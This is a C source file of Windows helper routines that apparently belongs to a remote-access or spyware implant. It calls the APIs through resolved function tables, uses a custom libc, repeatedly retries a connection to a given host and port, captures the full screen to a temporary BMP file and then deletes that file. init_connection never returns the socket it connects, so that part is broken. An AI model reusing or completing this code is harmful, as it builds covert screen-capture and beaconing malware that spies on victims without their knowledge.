#include "pch.h"
#include "framework.h"
#include "utils.h"
#include "utils_headers.h"

#include "headers.h"
#include "sleaping.h"

#include "mylibc/mylibc.h"

int startup_wsa(winsock_functions_t* ws_funcs)
{
	WSADATA wsa_data;
	int result = 1;
	if ((result = ws_funcs->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
	{
		return -1;
	}

	return 0;
}

void cleanup_wsa(winsock_functions_t* ws_funcs)
{
	ws_funcs->WSACleanup();
}

int init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
{
	SOCKET client_socket;
	struct sockaddr_in server_addr = { 0 };

	int result = 1;

	while(1)
	{
		client_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
		if (client_socket == INVALID_SOCKET)
		{
			return -1;
		}

		server_addr.sin_family = AF_INET;
		server_addr.sin_port = ws_funcs->Htons(port);
		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
		{
			return -1;
		}

		result = ws_funcs->Connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

		if (result == SOCKET_ERROR)
		{
			ws_funcs->CloseSocket(client_socket);
			core_funcs->Sleep(5000);
			continue;
		}
		break;
	}

	return 0;

}

char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_funcs)
{
	DWORD tick_count;
	int result = 0;
	int basename_len = 0;
	char* name = (char*)my_malloc(MAX_NAME_LEN);
	if (!name)
		return NULL;
	
	my_memset(name, 0, MAX_NAME_LEN);

	if ((result = GetTempPathA(MAX_PATH, name)) == 0)
	{
		result = -1;
		goto __cleanup;
	}

	my_strncat(name, basename, my_strlen(basename));


	basename_len = my_strlen(name);
	name[basename_len] = '-';

	tick_count = kernel_funcs->GetTickCount();
	
	my_lltoa(tick_count, name + (basename_len + 1), 10);

	return name;

__cleanup:

	my_free(name);
	return NULL;
}

int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32_funcs, user32_functions_t* user32_funcs, gdi32_functions_t* gdi32_funcs)
{
	if (kernel32_funcs == NULL || user32_funcs == NULL || gdi32_funcs == NULL)
	{
		return -1;
	}

	gdi32_functions_t* gdi = gdi32_funcs;
	user32_functions_t* user32 = user32_funcs;
	kernel32_functions_t* kernel32 = kernel32_funcs;

	HDC hdcScreen = NULL;
	HDC hdcMemDC = NULL;
	HBITMAP hBitmap = NULL;
	HGDIOBJ hOldBitmap = NULL;
	BITMAPINFOHEADER bi;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	int success = 0;

	DWORD dwBmpSize = 0;
	DWORD bytesWritten = 0;
	BYTE* lpbitmap = NULL;
	DWORD fileSize = 0;

	// Get Screen DC
	hdcScreen = user32->GetDC(NULL);
	if (!hdcScreen)
	{
		return -1;
	}

	// Create compatible DC
	hdcMemDC = gdi->CreateCompatibleDC(hdcScreen);
	if (!hdcMemDC)
	{
		user32->ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	int screen_width = user32->GetSystemMetrics(SM_CXSCREEN);
	int screen_height = user32->GetSystemMetrics(SM_CYSCREEN);

	// Create compatible bitmap
	hBitmap = gdi->CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
	if (!hBitmap)
	{
		gdi->DeleteDC(hdcMemDC);
		user32->ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	// Select bitmap to MemDC
	hOldBitmap = gdi->SelectObject(hdcMemDC, hBitmap);

	// Copy screen to MemDC
	if (!gdi->BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY))
	{
		goto cleanup_0;
	}

	ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = screen_width;
	bi.biHeight = -screen_height;  // negative value indicates DIB from top to bottom
	bi.biPlanes = 1;
	bi.biBitCount = 24;  // 24bits color
	bi.biCompression = BI_RGB;

	dwBmpSize = ((screen_width * 24 + 31) / 32) * 4 * screen_height;
	hFile = kernel32->CreateFileA(
		filename,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto cleanup_0;
	}

	BITMAPFILEHEADER bmfHeader;
	bmfHeader.bfType = 0x4D42;  // "BM"
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// write bmp header
	if (!kernel32->WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// write bitmap info header
	if (!kernel32->WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// allocate mem and get bitmap data
	lpbitmap = (BYTE*)VirtualAlloc(NULL, dwBmpSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpbitmap)
	{
		goto cleanup;
	}

	if (!gdi->GetDIBits(hdcScreen, hBitmap, 0, (UINT)screen_height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
	{
		goto cleanup;
	}

	if (!kernel32->WriteFile(hFile, lpbitmap, dwBmpSize, &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// Ensure that data is written to the disk
	kernel32->FlushFileBuffers(hFile);

	fileSize = kernel32->GetFileSize(hFile, NULL);

	success = 1;


cleanup:

	if (lpbitmap) VirtualFree(lpbitmap, 0, MEM_RELEASE);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		kernel32->CloseHandle(hFile);
	}

cleanup_0:

	if (hOldBitmap) gdi->SelectObject(hdcMemDC, hOldBitmap);
	if (hBitmap) gdi->DeleteObject(hBitmap);
	if (hdcMemDC) gdi->DeleteDC(hdcMemDC);
	if (hdcScreen) user32->ReleaseDC(NULL, hdcScreen);

	return success ? 0 : -1;
}

int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
{
	if (kernel_funcs->DeleteFileA(filename))
		return 0;
	else
		return -1;
}
